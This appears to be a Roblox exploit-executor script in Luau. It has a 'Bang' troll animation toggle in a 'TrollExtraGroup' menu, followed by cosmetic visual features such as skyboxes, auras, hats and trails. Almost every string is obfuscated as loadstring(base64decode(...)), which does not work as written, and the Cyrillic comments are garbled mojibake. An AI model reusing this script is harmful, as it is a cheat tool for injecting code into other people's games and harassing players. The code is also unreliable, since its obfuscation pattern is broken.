local bangSpeed = 10-- рџ”Ґ РЎРљРћР РћРЎРўР¬ (1 = РЅРѕСЂРјР°Р»СЊРЅРѕ, 0.3вЂ“0.5 РјРµРґР»РµРЅРЅРѕ)

-- в–¶ Р·Р°РїСѓСЃРє Р°РЅРёРјР°С†РёРё
function startBang()
	local plr = Players.LocalPlayer
	local char = plr.Character or plr.CharacterAdded:Wait()
	local hum = char:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
	if not hum then
		return
	end
	local animator = hum:FindFirstChildOfClass(loadstring(base64decode("QW5pbWF0b3I="))())
	if not animator then
		animator = Instance.new(loadstring(base64decode("QW5pbWF0b3I="))())
		animator.Parent = hum
	end
	local anim = Instance.new(loadstring(base64decode("QW5pbWF0aW9u"))())
	anim.AnimationId = bangAnimId
	bangAnimTrack = animator:LoadAnimation(anim)
	bangAnimTrack.Priority = Enum.AnimationPriority.Action
	bangAnimTrack:Play()
	bangAnimTrack:AdjustSpeed(bangSpeed) -- рџђў Р·Р°РјРµРґР»РµРЅРёРµ

    -- Infinite Yield loop
	task.spawn(function()
		while playBangActive do
			task.wait(0.1)
			if bangAnimTrack and bangAnimTrack.IsPlaying then
				bangAnimTrack.TimePosition = 0.1
			end
		end
	end)
end

-- вЏ№ РѕСЃС‚Р°РЅРѕРІРєР°
function stopBang()
	if bangAnimTrack then
		bangAnimTrack:Stop()
		bangAnimTrack = nil
	end
end

-- рџ” Toggle
TrollExtraGroup:CreateToggle({
	Name = loadstring(base64decode("QmFuZyAoU2xvdyk="))(),
        Flag = loadstring(base64decode("QmFuZyAoU2xvdyk="))(),
	Default = false,
	Callback = function(on)
        SetToggleState(loadstring(base64decode("QmFuZyAoU2xvdyk="))(), on)
		playBangActive = on
		if on then
			startBang()
		else
			stopBang()
		end
	end
})


do
    local Lighting = game:GetService(loadstring(base64decode("TGlnaHRpbmc="))())
    local Visuals = {}

    Visuals.DefaultLighting = {
        Brightness=Lighting.Brightness, ClockTime=Lighting.ClockTime,
        GlobalShadows=Lighting.GlobalShadows, OutdoorAmbient=Lighting.OutdoorAmbient,
        Ambient=Lighting.Ambient, FogStart=Lighting.FogStart, FogEnd=Lighting.FogEnd,
        FogColor=Lighting.FogColor, ExposureCompensation=Lighting.ExposureCompensation,
    }
    Visuals.DefaultSkySettings = {}
    local defaultSky = Lighting:FindFirstChildOfClass(loadstring(base64decode("U2t5"))())
    if defaultSky then
        Visuals.DefaultSkySettings = {
            SkyboxBk=defaultSky.SkyboxBk, SkyboxDn=defaultSky.SkyboxDn,
            SkyboxFt=defaultSky.SkyboxFt, SkyboxLf=defaultSky.SkyboxLf,
            SkyboxRt=defaultSky.SkyboxRt, SkyboxUp=defaultSky.SkyboxUp,
        }
    end

    Visuals.HatEnabled=false; Visuals.HatTransparency=0.3; Visuals.HatRainbow=false
    Visuals.HatColor=Color3.fromRGB(0,255,255); Visuals.HatParts={}
    Visuals.TrailEnabled=false; Visuals.TrailGradient=false; Visuals.TrailLifetime=0.5
    Visuals.TrailTransparencyStart=0; Visuals.TrailRainbow=false
    Visuals.TrailColorStatic=Color3.fromRGB(0,255,255)
    Visuals.TrailGradient1=Color3.fromRGB(0,86,255); Visuals.TrailGradient2=Color3.fromRGB(255,0,0)
    Visuals.TrailParts={}
    Visuals.SkinTrailEnabled=false; Visuals.SkinTrailColor=Color3.fromRGB(255,0,0); Visuals.SkinTrailLife=0.5
    Visuals.ForceFieldEnabled=false; Visuals.ForceFieldColor=Color3.fromRGB(128,128,128)
    Visuals.ForceFieldRainbow=false; Visuals.OriginalColors={}
    Visuals.AuraEnabled=false; Visuals.AuraType=loadstring(base64decode("R29kbHk="))(); Visuals.CustomAuraID=loadstring(base64decode(""))()
    Visuals.CurrentAuraModel=nil; Visuals.AuraEffects={}
    Visuals.WorldTimeEnabled=false; Visuals.WorldTimeValue=12; Visuals.FullBrightEnabled=false
    Visuals.NebulaEnabled=false; Visuals.NebulaThemeColor=Color3.fromRGB(173,216,230)
    Visuals.CurrentSkybox=loadstring(base64decode("SEQ="))(); Visuals.CustomSkyEnabled=false
    Visuals.ScreenEnabled=false; Visuals.ScreenIntensity=0; Visuals.ScreenConnection=nil
    Visuals.AnimeImageEnabled=false; Visuals.AnimeImageGui=nil

    Visuals.AuraModels = {
        Godly=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE2Njk5NzUwOTgx"))(),[loadstring(base64decode("U3VwZXIgU2F5aWVu"))()]=loadstring(base64decode("cmJ4YXNzZXRpZDovLzExNjEwOTUwODM2NDI5Nw=="))(),
        [loadstring(base64decode("Tm9ydGggU3Rhcg=="))()]=loadstring(base64decode("cmJ4YXNzZXRpZDovLzgzOTQ1MDY5NjUyNzMy"))(),[loadstring(base64decode("Qmx1ZSBMb3Jk"))()]=loadstring(base64decode("cmJ4YXNzZXRpZDovLzEwOTc0MzE2Nzk5"))(),
        [loadstring(base64decode("UGluayBBdXJh"))()]=loadstring(base64decode("cmJ4YXNzZXRpZDovLzExNTk4MDg1OTYxNTIzOQ=="))(),[loadstring(base64decode("QW5nZWwgV2luZw=="))()]=loadstring(base64decode("cmJ4YXNzZXRpZDovLzkwMDIyOTY5Njk2MDcz"))(),
        [loadstring(base64decode("U3dlZXQgSGVhcnQ="))()]=loadstring(base64decode("cmJ4YXNzZXRpZDovLzkxNzI0NzY4MTc1NDcw"))(),[loadstring(base64decode("RXRoZXJlYWwgQXVyYQ=="))()]=loadstring(base64decode("cmJ4YXNzZXRpZDovLzk3MDQxNTY4Njc0MjUw"))(),
    }

    Visuals.SkyboxAssets = {
        [loadstring(base64decode("QmxhY2sgU3Rvcm0="))()]={Bk=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE1NTAyNTExMjg4"))(),Dn=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE1NTAyNTA4NDYw"))(),Ft=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE1NTAyNTEwMjg5"))(),Lf=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE1NTAyNTA3OTE4"))(),Rt=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE1NTAyNTA5Mzk4"))(),Up=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE1NTAyNTExOTEx"))()},
        HD={Bk=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNjU1MzY1ODkzNw=="))(),Dn=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNjU1MzY2MDcxMw=="))(),Ft=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNjU1MzY2MjE0NA=="))(),Lf=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNjU1MzY2NDA0Mg=="))(),Rt=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNjU1MzY2NTc2Ng=="))(),Up=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNjU1MzY2Nzc1MA=="))()},
        Snow={Bk=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNTU2NTc2NTU="))(),Dn=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNTU2NzQyNDY="))(),Ft=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNTU2NTc2MDk="))(),Lf=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNTU2NTc2NzE="))(),Rt=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNTU2NTc2MTk="))(),Up=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNTU2NzQ5MzE="))()},
        [loadstring(base64decode("Qmx1ZSBTcGFjZQ=="))()]={Bk=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE1NTM2MTEwNjM0"))(),Dn=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE1NTM2MTEyNTQz"))(),Ft=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE1NTM2MTE2MTQx"))(),Lf=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE1NTM2MTE0Mzcw"))(),Rt=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE1NTM2MTE4NzYy"))(),Up=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE1NTM2MTE3Mjgy"))()},
        Realistic={Bk=loadstring(base64decode("cmJ4YXNzZXRpZDovLzY1MzcxOTUwMg=="))(),Dn=loadstring(base64decode("cmJ4YXNzZXRpZDovLzY1MzcxODc5MA=="))(),Ft=loadstring(base64decode("cmJ4YXNzZXRpZDovLzY1MzcxOTA2Nw=="))(),Lf=loadstring(base64decode("cmJ4YXNzZXRpZDovLzY1MzcxOTE5MA=="))(),Rt=loadstring(base64decode("cmJ4YXNzZXRpZDovLzY1MzcxODkzMQ=="))(),Up=loadstring(base64decode("cmJ4YXNzZXRpZDovLzY1MzcxOTMyMQ=="))()},
        Stormy={Bk=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xODcwMzI0NTgzNA=="))(),Dn=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xODcwMzI0MzM0OQ=="))(),Ft=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xODcwMzI0MDUzMg=="))(),Lf=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xODcwMzIzNzU1Ng=="))(),Rt=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xODcwMzIzNTQzMA=="))(),Up=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xODcwMzIzMjY3MQ=="))()},
        Pink={Bk=loadstring(base64decode("cmJ4YXNzZXRpZDovLzEyMjE2MTA5MjA1"))(),Dn=loadstring(base64decode("cmJ4YXNzZXRpZDovLzEyMjE2MTA5ODc1"))(),Ft=loadstring(base64decode("cmJ4YXNzZXRpZDovLzEyMjE2MTA5NDg5"))(),Lf=loadstring(base64decode("cmJ4YXNzZXRpZDovLzEyMjE2MTEwMTcw"))(),Rt=loadstring(base64decode("cmJ4YXNzZXRpZDovLzEyMjE2MTEwNDcx"))(),Up=loadstring(base64decode("cmJ4YXNzZXRpZDovLzEyMjE2MTA4ODc3"))()},
        Sunset={Bk=loadstring(base64decode("cmJ4YXNzZXRpZDovLzYwMDgzMDQ0Ng=="))(),Dn=loadstring(base64decode("cmJ4YXNzZXRpZDovLzYwMDgzMTYzNQ=="))(),Ft=loadstring(base64decode("cmJ4YXNzZXRpZDovLzYwMDgzMjcyMA=="))(),Lf=loadstring(base64decode("cmJ4YXNzZXRpZDovLzYwMDg4NjA5MA=="))(),Rt=loadstring(base64decode("cmJ4YXNzZXRpZDovLzYwMDgzMzg2Mg=="))(),Up=loadstring(base64decode("cmJ4YXNzZXRpZDovLzYwMDgzNTE3Nw=="))()},
        Arctic={Bk=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0yMjU0NjkzOTA="))(),Dn=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0yMjU0NjkzOTU="))(),Ft=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0yMjU0Njk0MDM="))(),Lf=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0yMjU0Njk0NTA="))(),Rt=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0yMjU0Njk0NzE="))(),Up=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0yMjU0Njk0ODE="))()},
        Space={Bk=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNjY1MDk5OTk="))(),Dn=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNjY1MTAwNTc="))(),Ft=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNjY1MTAxMTY="))(),Lf=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNjY1MTAwOTI="))(),Rt=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNjY1MTAxMzE="))(),Up=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNjY1MTAxMTQ="))()},
        [loadstring(base64decode("Um9ibG94IERlZmF1bHQ="))()]={Bk=loadstring(base64decode("cmJ4YXNzZXQ6Ly90ZXh0dXJlcy9za3kvc2t5NTEyX2JrLnRleA=="))(),Dn=loadstring(base64decode("cmJ4YXNzZXQ6Ly90ZXh0dXJlcy9za3kvc2t5NTEyX2RuLnRleA=="))(),Ft=loadstring(base64decode("cmJ4YXNzZXQ6Ly90ZXh0dXJlcy9za3kvc2t5NTEyX2Z0LnRleA=="))(),Lf=loadstring(base64decode("cmJ4YXNzZXQ6Ly90ZXh0dXJlcy9za3kvc2t5NTEyX2xmLnRleA=="))(),Rt=loadstring(base64decode("cmJ4YXNzZXQ6Ly90ZXh0dXJlcy9za3kvc2t5NTEyX3J0LnRleA=="))(),Up=loadstring(base64decode("cmJ4YXNzZXQ6Ly90ZXh0dXJlcy9za3kvc2t5NTEyX3VwLnRleA=="))()},
        [loadstring(base64decode("UmVkIE5pZ2h0"))()]={Bk=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD00MDE2NjQ4Mzk="))(),Dn=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD00MDE2NjQ4NjI="))(),Ft=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD00MDE2NjQ5NjA="))(),Lf=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD00MDE2NjQ4ODE="))(),Rt=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD00MDE2NjQ5MDE="))(),Up=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD00MDE2NjQ5MzY="))()},
        [loadstring(base64decode("RGVlcCBTcGFjZSAx"))()]={Bk=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNDkzOTc2OTI="))(),Dn=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNDkzOTc2ODY="))(),Ft=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNDkzOTc2OTc="))(),Lf=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNDkzOTc2ODQ="))(),Rt=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNDkzOTc2ODg="))(),Up=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNDkzOTc3MDI="))()},
        [loadstring(base64decode("UGluayBTa2llcw=="))()]={Bk=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNTExNjUyMTQ="))(),Dn=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNTExNjUxOTc="))(),Ft=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNTExNjUyMjQ="))(),Lf=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNTExNjUxOTE="))(),Rt=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNTExNjUyMDY="))(),Up=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNTExNjUyMjc="))()},
        [loadstring(base64decode("UHVycGxlIFN1bnNldA=="))()]={Bk=loadstring(base64decode("cmJ4YXNzZXRpZDovLzI2NDkwODMzOQ=="))(),Dn=loadstring(base64decode("cmJ4YXNzZXRpZDovLzI2NDkwNzkwOQ=="))(),Ft=loadstring(base64decode("cmJ4YXNzZXRpZDovLzI2NDkwOTQyMA=="))(),Lf=loadstring(base64decode("cmJ4YXNzZXRpZDovLzI2NDkwOTc1OA=="))(),Rt=loadstring(base64decode("cmJ4YXNzZXRpZDovLzI2NDkwODg4Ng=="))(),Up=loadstring(base64decode("cmJ4YXNzZXRpZDovLzI2NDkwNzM3OQ=="))()},
        [loadstring(base64decode("Qmx1ZSBOaWdodA=="))()]={Bk=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xMjA2NDEwNw=="))(),Dn=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xMjA2NDE1Mg=="))(),Ft=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xMjA2NDEyMQ=="))(),Lf=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xMjA2Mzk4NA=="))(),Rt=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xMjA2NDExNQ=="))(),Up=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xMjA2NDEzMQ=="))()},
        [loadstring(base64decode("Qmxvc3NvbSBEYXlsaWdodA=="))()]={Bk=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0yNzEwNDI1MTY="))(),Dn=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0yNzEwNzcyNDM="))(),Ft=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0yNzEwNDI1NTY="))(),Lf=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0yNzEwNDIzMTA="))(),Rt=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0yNzEwNDI0Njc="))(),Up=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0yNzEwNzc5NTg="))()},
        [loadstring(base64decode("Qmx1ZSBOZWJ1bGE="))()]={Bk=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0P2lkPTEzNTIwNzc0NA=="))(),Dn=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0P2lkPTEzNTIwNzY2Mg=="))(),Ft=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0P2lkPTEzNTIwNzc3MA=="))(),Lf=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0P2lkPTEzNTIwNzYxNQ=="))(),Rt=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0P2lkPTEzNTIwNzY5NQ=="))(),Up=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0P2lkPTEzNTIwNzc5NA=="))()},
        [loadstring(base64decode("Qmx1ZSBQbGFuZXQ="))()]={Bk=loadstring(base64decode("cmJ4YXNzZXRpZDovLzIxODk1NTgxOQ=="))(),Dn=loadstring(base64decode("cmJ4YXNzZXRpZDovLzIxODk1MzQxOQ=="))(),Ft=loadstring(base64decode("cmJ4YXNzZXRpZDovLzIxODk1NDUyNA=="))(),Lf=loadstring(base64decode("cmJ4YXNzZXRpZDovLzIxODk1ODQ5Mw=="))(),Rt=loadstring(base64decode("cmJ4YXNzZXRpZDovLzIxODk1NzEzNA=="))(),Up=loadstring(base64decode("cmJ4YXNzZXRpZDovLzIxODk1MDA5MA=="))()},
        [loadstring(base64decode("RGVlcCBTcGFjZSAy"))()]={Bk=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNTkyNDgxODg="))(),Dn=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNTkyNDgxODM="))(),Ft=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNTkyNDgxODc="))(),Lf=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNTkyNDgxNzM="))(),Rt=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNTkyNDgxOTI="))(),Up=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNTkyNDgxNzY="))()},
        Summer={Bk=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE2NjQ4NTkwOTY0"))(),Dn=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE2NjQ4NjE3NDM2"))(),Ft=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE2NjQ4NTk1NDI0"))(),Lf=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE2NjQ4NTY2Mzcw"))(),Rt=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE2NjQ4NTc3MDcx"))(),Up=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE2NjQ4NTk4MTgw"))()},
        Galaxy={Bk=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE1OTgzOTY4OTIy"))(),Dn=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE1OTgzOTY2ODI1"))(),Ft=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE1OTgzOTY1MDI1"))(),Lf=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE1OTgzOTY3NDIw"))(),Rt=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE1OTgzOTY2MjQ2"))(),Up=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE1OTgzOTY0MjQ2"))()},
        Stylized={Bk=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE4MzUxMzc2ODU5"))(),Dn=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE4MzUxMzc0OTE5"))(),Ft=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE4MzUxMzc2ODAw"))(),Lf=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE4MzUxMzc2NDY5"))(),Rt=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE4MzUxMzc2NDU3"))(),Up=loadstring(base64decode("cmJ4YXNzZXRpZDovLzE4MzUxMzc3MTg5"))()},
        Minecraft={Bk=loadstring(base64decode("cmJ4YXNzZXRpZDovLzg3MzUxNjY3NTY="))(),Dn=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD04NzM1MTY2NzA3"))(),Ft=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD04NzM1MjMxNjY4"))(),Lf=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD04NzM1MTY2NzU1"))(),Rt=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD04NzM1MTY2NzUx"))(),Up=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD04NzM1MTY2NzI5"))()},
        [loadstring(base64decode("Q2xvdWR5IFJhaW4="))()]={Bk=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD00NDk4ODI4Mzgy"))(),Dn=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD00NDk4ODI4ODEy"))(),Ft=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD00NDk4ODI5OTE3"))(),Lf=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD00NDk4ODMwOTEx"))(),Rt=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD00NDk4ODMwNDE3"))(),Up=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD00NDk4ODMxNzQ2"))()},
        [loadstring(base64decode("QmxhY2sgQ2xvdWR5IFJhaW4="))()]={Bk=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNDk2Nzk2Njk="))(),Dn=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNDk2ODE5Nzk="))(),Ft=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNDk2Nzk2OTA="))(),Lf=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNDk2Nzk3MDk="))(),Rt=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNDk2Nzk3MjI="))(),Up=loadstring(base64decode("aHR0cDovL3d3dy5yb2Jsb3guY29tL2Fzc2V0Lz9pZD0xNDk2ODAxOTk="))()},
    }

    -- Hat
    function Visuals.removeHat(c) local h=Visuals.HatParts[c]; if h then h:Destroy(); Visuals.HatParts[c]=nil end end
    function Visuals.addHat(c) task.wait(0.1); local head=c and c:FindFirstChild(loadstring(base64decode("SGVhZA=="))()); if not head then return end; Visuals.removeHat(c); local hat=Instance.new(loadstring(base64decode("UGFydA=="))()); hat.Name=loadstring(base64decode("SGF0"))(); hat.Transparency=Visuals.HatTransparency; hat.Color=Visuals.HatColor; hat.Material=Enum.Material.Neon; hat.CanCollide=false; hat.CanTouch=false; hat.CanQuery=false; hat.Massless=true; local m=Instance.new(loadstring(base64decode("U3BlY2lhbE1lc2g="))()); m.MeshId=loadstring(base64decode("cmJ4YXNzZXRpZDovLzEwMzM3MTQ="))(); m.Scale=Vector3.new(2.4,1.6,2.4); m.Parent=hat; local w=Instance.new(loadstring(base64decode("V2VsZENvbnN0cmFpbnQ="))()); w.Part0=head; w.Part1=hat; w.Parent=hat; hat.CFrame=head.CFrame*CFrame.new(0,1.1,0); hat.Parent=c; Visuals.HatParts[c]=hat end
    function Visuals.updateHats() for c,h in pairs(Visuals.HatParts) do if h and h.Parent and c==Player.Character then h.Transparency=Visuals.HatTransparency; h.Color=Visuals.HatRainbow and Color3.fromHSV((tick()%5)/5,1,1) or Visuals.HatColor end end end

    -- Trail
    function Visuals.removeTrail(c) if Visuals.TrailParts[c] then Visuals.TrailParts[c]:Destroy(); Visuals.TrailParts[c]=nil end; local t=c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()); if t then local a0=t:FindFirstChild(loadstring(base64decode("VHJhaWxBdHRhY2gw"))()); local a1=t:FindFirstChild(loadstring(base64decode("VHJhaWxBdHRhY2gx"))()); if a0 then a0:Destroy() end; if a1 then a1:Destroy() end end end
    function Visuals.addTrail(c) local t=c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()); if not t then return end; Visuals.removeTrail(c); local a0=Instance.new(loadstring(base64decode("QXR0YWNobWVudA=="))()); a0.Name=loadstring(base64decode("VHJhaWxBdHRhY2gw"))(); a0.Position=Vector3.new(0,2,0); a0.Parent=t; local a1=Instance.new(loadstring(base64decode("QXR0YWNobWVudA=="))()); a1.Name=loadstring(base64decode("VHJhaWxBdHRhY2gx"))(); a1.Position=Vector3.new(0,-2,0); a1.Parent=t; local tr=Instance.new(loadstring(base64decode("VHJhaWw="))()); tr.Attachment0=a0; tr.Attachment1=a1; tr.Lifetime=Visuals.TrailLifetime; tr.LightEmission=0.2; tr.Enabled=true; tr.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,Visuals.TrailTransparencyStart),NumberSequenceKeypoint.new(1,1)}); tr.Color=Visuals.TrailGradient and ColorSequence.new(Visuals.TrailGradient1,Visuals.TrailGradient2) or ColorSequence.new(Visuals.TrailColorStatic); tr.Parent=c; Visuals.TrailParts[c]=tr end
